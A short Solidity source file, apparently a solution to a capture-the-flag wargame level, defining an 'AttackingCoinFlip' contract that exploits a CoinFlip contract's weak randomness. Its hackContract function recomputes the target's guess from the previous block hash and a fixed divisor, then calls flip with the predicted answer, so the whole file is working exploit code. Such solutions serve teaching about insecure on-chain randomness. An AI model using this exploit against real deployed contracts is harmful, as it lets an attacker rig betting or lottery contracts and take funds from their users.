// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    CoinFlip private coinFlipContract;

    constructor(address _contractAddress) {
        coinFlipContract = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / factor == 1;

        coinFlipContract.flip(guess);
    }
}
